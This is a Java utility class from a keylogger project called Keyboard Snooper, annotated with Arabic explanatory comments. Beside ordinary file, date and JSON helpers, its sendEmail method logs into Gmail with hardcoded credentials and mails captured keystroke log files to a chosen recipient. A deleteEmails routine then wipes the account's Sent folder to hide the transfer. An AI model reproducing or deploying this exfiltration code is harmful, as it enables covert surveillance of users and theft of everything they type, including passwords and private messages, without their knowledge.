package com.snooper;

import com.snooper.tray.*;

import java.util.*; // ArrayList  لاستخدام
import java.io.*;//يوفر إدخال وإخراج النظام من خلال تدفقات البيانات والتسلسل ونظام الملفات.
import java.text.*;//يوفر فئات وواجهات للتعامل مع النصوص والتواريخ والأرقام والرسائل بطريقة مستقلة عن اللغات الطبيعية.
import javax.swing.*;
import java.net.*;//توفير فصول لتنفيذ تطبيقات الشبكات.
import java.awt.*;//يحتوي على جميع الفئات لإنشاء واجهات المستخدم ولطلاء الرسومات والصور.

import java.util.regex.*;//يستخدم على نطاق واسع لتحديد القيد على السلاسل مثل التحقق من صحة كلمة المرور والبريد الإلكتروني. 
import javax.mail.*;//توفر JavaMailTM API فئات تشكل نموذجًا لنظام البريد. تحدد حزمة javax.mail الفئات المشتركة بين جميع أنظمة البريد. تحدد حزمة javax.mail.internet الفئات الخاصة بأنظمة البريد بناءً على معايير الإنترنت مثل MIME و SMTP و POP3 و IMAP. تتضمن واجهة برمجة تطبيقات JavaMail حزمة javax.mail والحزم الفرعية.
import javax.activation.*;// » javax التنشيط » 1.1 ... يتم استخدام إطار تنشيط JavaBeans (TM) بواسطة واجهة برمجة تطبيقات JavaMail (TM) لإدارة بيانات MIME ...

import javax.mail.internet.*;
import java.util.concurrent.*;//فئات المنفعة مفيدة في البرمجة المتزامنة
import javafx.scene.*;
import javafx.scene.control.*;

//Gson هي مكتبة Java يمكن استخدامها لتحويل Java Objects إلى تمثيل JSON الخاص بهم. يمكن استخدامه أيضًا لتحويل سلسلة JSON إلى كائن Java مكافئ. Gson هو مشروع مفتوح المصدر
//https://sites.google.com/site/gson/gson-user-guide
import com.google.gson.Gson;

public class Util {
	
    //static يستخدم لتعريف كلاس أو متغير أو دالة مشتركة بين جميع الكائنات من كلاس معين.
    //final لا يمكن تغييرها من جديد
    // VALID_EMAIL_ADDRESS_REGEX صالح البريد الإلكتروني العنوان REGEX لتحديد القيد على النص
    //CASE_INSENSITIVE حالة الأحرف
    
//    https://www.javatpoint.com/java-regex شرح توضيح الرموز
	public static final Pattern VALID_EMAIL_ADDRESS_REGEX = 
		Pattern.compile("^[A-Z0-9._%+-]+@[A-Z0-9.-]+\\.[A-Z]{2,6}$", Pattern.CASE_INSENSITIVE);
	
	//create a file in the disk
        // إنشاء ملف في القرص
	public static File createFile(String filename) {
		File file = new File(filename);
		checkParentFile(file);
		try {
			if (file.createNewFile()) {
				System.out.println("File created: " + filename);
			} else {
				System.out.println("Error creating file: " + filename);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		return file;
	}
        ////////////////////////////////////static دوال
	////////الدالة دائماً يتم تعريفها مرة واحدة في الذاكرة و جميع الكائنات من نفس الكلاس ستشير إليها
	///////لدالة التي نوعها static يمكنها الوصول للمتغيرات المعرفة في الكلاس بشرط أن تكون هذه المتغيرات أيضاً static
        
        
        
        public static void checkParentFile(File file) {//تحقق من ملف الأصل
		File parentFile = file.getParentFile();
		try {
			if (parentFile != null) {
				parentFile.mkdirs();
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	//get the current date within the given format
        // دالة للحصول على التاريخ الحالي بالتنسيق المحدد
	public static String getCurrentDate(String format) {
		return toString(new Date(), format);
	}
	
        //// يحول السلسلة إلى ملف ويمررها إلى طريقة hasInstance (ملف ملف)
	//converts the string to file and pass it to hasInstance(File file) method
	public static boolean hasInstance(String filePath) {
		return hasInstance(new File(filePath));
	}
	
	//checks if the file has already been created
        //// يتحقق مما إذا كان الملف قد تم إنشاؤه بالفعل
	public static boolean hasInstance(File file) {
		if (file.exists()) {
			return true;
		}
		
		return false;
	}
	
	public static String getHourly() {//الحصول على تحديث الاتقاط كل ساعه حسب التنسيق المحدد
		return "Hourly update as of: " + Util.getCurrentDate(Snooper.perHourFormat);
	}
	
	public static void goLink(String link) {//داله لفتح الروابط في المتصفح
		try {
			Desktop.getDesktop().browse(new URI(link));
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
        ////////////////////////////////////////////////////////////////////////////////////?
	public static boolean serialize_json(Serializable serializable, String filepath) {
		Gson gson = new Gson();
		File file = new File(filepath + (filepath.contains(".json") ? "" : ".json"));
		checkParentFile(file);//استدعاء داله التحقق من الملف الاصل
		
		try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {
			gson.toJson(serializable, writer);
		} catch (Exception ex) {
			ex.printStackTrace();
			return false;
		}
		
		return true;
	}
	
	public static <T>T deserialize_json(Class<T> c, String filepath) {
		Gson gson = new Gson();
		try (BufferedReader reader = new BufferedReader(new FileReader(filepath + (filepath.contains(".json") ? "" : ".json")))) {
			return gson.fromJson(reader,c);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		return null;
	}
	
	public static Pref loadPref() { //استرجاع الحدث او انشاءه الحدث الخاص بالاداء
            // تم استدعاء الداله في كلاس سنوبر 
            // pref = Util.loadPref();//>> //لاسترجاع حاله السجل او انشاء سجل جديدالخاص بالاداء

		Pref pref = deserialize_json(Pref.class, Snooper.PREF_FILEPATH);
		if (pref == null) {
			pref = createPref();
		}
		return pref;
	}
	
	public static boolean savePref(Pref pref) {
		if (pref == null) return false;
		
		serialize_json(pref,Snooper.PREF_FILEPATH);
		return true;
	}
	
	public static Pref createPref() {
		Pref pref = new Pref();
		serialize_json(pref,Snooper.PREF_FILEPATH);
		return pref;
	}
	
	public static void notif(String message) {
		notif(Snooper.TITLE, message);
	}
	
	public static void notif(String title, String message) {
		Snooper snooper = Snooper.getInstance();
		Pref pref = snooper.getPref();
		pref.notif(snooper.getTrayIcon(), title, message);
	}
	
	public static File[] getFiles(String parentDir, String extension) {
		return getFiles(new File(parentDir), extension);
	}
	
	public static File[] getFiles(File parentDir, String extension) {
		return parentDir.listFiles((dir,name) -> {
			return name.toLowerCase().endsWith(extension);
		});
	}
	
	public static File[] getSLogFiles(File parentDir) {
		return getFiles(parentDir, Snooper.EXTENSION_NAME);
	}
	
	public static File[] getSLogFiles(String parentDir) {
		return getSLogFiles(new File(parentDir));
	}
	
	//optional to reverse array
        //// اختياري لعكس الصفيف
	public static <T> void reverse(T[] array) {
		Collections.reverse(Arrays.asList(array));
	}
	
	public static boolean tryParseInt(String value) {
		try {
			Integer.parseInt(value);
			return true;
		} catch (Exception e) {
			e.printStackTrace();
			return false;
		}
	}
	
	public static boolean withinRange(int bound1, int bound2, int test) {
		if (test >= bound1 && test <= bound2) return true;
		if (test <= bound1 && test >= bound2) return true;
		return false;
	}
	
	public static Date toDate(String dateString, String format) {
		Date date = null;
		try {
			DateFormat dateFormat = new SimpleDateFormat(format);
			date = dateFormat.parse(dateString);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		return date;
	}
	
	public static String toString(Date date, String format) {
		if (date == null) return "DATE_ERROR"; //fix if date is null just return DATE_ERROR
		DateFormat dateFormat = new SimpleDateFormat(format);
		return dateFormat.format(date);
	}
	
        // التاريخ في سلسلة إلى تنسيق آخر في السلسلة
	//date in string to another format in string
	public static String toString(String dateString, String formatParse, String formatTo) {
		Date date = toDate(dateString,formatParse);
		return toString(date,formatTo);
	}
	
                // داله تغيير  الصورة
	public static Image createAwtImage(String path, String description) {
		return (new ImageIcon(path,description)).getImage();
	}
	
        
        // داله تغيير  الصورة
	public static javafx.scene.image.Image createJavaFXImage(String path) {
		return new javafx.scene.image.Image("file:" + path);
	}
	
        //داله فتح ملف السجل
	public static void openFileDefault(File file) {
		try {
			Desktop.getDesktop().open(file);
		} catch (Exception ex) {
			Util.notif(Snooper.TITLE, "Error opening current log...");
		}
	}
	
	public static boolean isEmailValid(String string) {
            //matcher() ينشئ المطابق الذي يطابق الإدخال المحدد مع النمط.
		Matcher matcher = VALID_EMAIL_ADDRESS_REGEX.matcher(string);
		return matcher.find();
	}
	
        
        // داله ارسال الايميل
	public static void sendEmail(String to, String subjectText, String messageText, SLogFile sLogFile) {
		String from = "keyboardsnooper@gmail.com";
		String username = "keyboardsnooper";
		String password = "keyboardsnooperpassword";
		
		Properties props = System.getProperties();
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.host", "smtp.gmail.com");
		props.put("mail.smtp.port", "587");
		props.put("mail.smtp.starttls.enable", "true");
		props.put("mail.smtp.ssl.trust", "smtp.gmail.com");
		props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
		
		Session session = Session.getInstance(props,
			new javax.mail.Authenticator() {
				protected javax.mail.PasswordAuthentication getPasswordAuthentication() {
					return new javax.mail.PasswordAuthentication(username,password);
				}
		});
		
		try {
			Message message = new MimeMessage(session);
			message.setFrom(new InternetAddress(from));
			message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(to));
			
			//set subject and message
			message.setSubject(subjectText);
			BodyPart messageBodyPart = new MimeBodyPart();
			messageBodyPart.setText(messageText);
			Multipart multipart = new MimeMultipart();
			multipart.addBodyPart(messageBodyPart);
			
			//attach file
			messageBodyPart = new MimeBodyPart();
			String filename = sLogFile.getFilepath();
			DataSource source = new FileDataSource(filename);
			messageBodyPart.setDataHandler(new DataHandler(source));
			messageBodyPart.setFileName(sLogFile.getFilename());
			multipart.addBodyPart(messageBodyPart);
			
			message.setContent(multipart);
			
			//send the complete message
			Transport.send(message);
			Util.notif(Snooper.TITLE, "Sent message successfully...");
			
			//we want to delete emails in sent folder
			deleteEmails("[Gmail]/Sent Mail", username, password);
			//end delete email
			
		} catch (Exception e) {
			Util.notif(Snooper.TITLE, "Problem sending message...");
		}
	}
	
        // حذف رسائل البريد الإلكتروني في مجلد معين
	//delete emails on specific folder
	//https://www.tutorialspoint.com/javamail_api/javamail_api_deleting_emails.htm
	public static void deleteEmails(String folder, String user, String password) {
		
		String imapHost = "imap.gmail.com";
		String storeType = "imaps";
		
		// get the session object
        try {
			Properties properties = new Properties();
			properties.put("mail.store.protocol", storeType);
			properties.put("mail.imaps.host", imapHost);
			properties.put("mail.imaps.port","993");
			properties.put("mail.imaps.auth","true");
			properties.put("mail.imaps.ssl.trust","*");
			properties.put("mail.imaps.starttls.enable", "true");
			Session emailSession = Session.getDefaultInstance(properties);
			
			Store store = emailSession.getStore(storeType);
			store.connect(imapHost, user, password);
			
			/*Use this to check all folder
			Folder[] f = store.getDefaultFolder().list();
			for(Folder fd:f) {
				Folder[] fc = fd.list();
				System.out.println(fd);
				for (Folder fc1 : fc) {
					System.out.println(fc1);
				}
			}
			*/
			
			Folder emailFolder = store.getFolder(folder);
			emailFolder.open(Folder.READ_WRITE);
			
			Message[] messages = emailFolder.getMessages();
			System.out.println("MESSAGES: " + messages.length);
			for (int i = 0; i < messages.length; i++) {
				Message message = messages[i];
				message.setFlag(Flags.Flag.DELETED, true);
			}
			
			//closes all messages marked deleted
			emailFolder.close(true);
			store.close();
			
			
			Util.notif("Emails deleted successfully...");
		} catch (Exception ex) {
			Util.notif("Problem deleting emails...");
			ex.printStackTrace();
		}
	}
	
	public static void sendEmailSnoopLog(String to, SLogFile sLogFile) {
		sendEmail(
			to,
			"Keyboard Snooper (SnoopLog by " + Snooper.getInstance().getPref().getNickname() + "): " + sLogFile.getDate(),
			"Support me on patreon: https://patreon.com/doppelgunner \nor through paypal: https://www.paypal.me/doppelgunner",
			sLogFile
		);
	}
	
        ///////////////////////////////////////////////////////
	public static long getMinutes(long time) {
		return TimeUnit.MILLISECONDS.toMinutes(time);
	}
	
	public static long getMinutesStarting(long from, long to) {
		return TimeUnit.MILLISECONDS.toMinutes(to - from);
	}
	
	public static void addTooltip(Node node, String msg) {
		Tooltip tooltip = new Tooltip(msg);
		Tooltip.install(node,tooltip);
	}
	
	public static String removeExtension(String filename) {
		int pos = filename.lastIndexOf(".");
		if (pos > 0) {
			return filename.substring(0, pos);
		}
		
		return null;
	}
}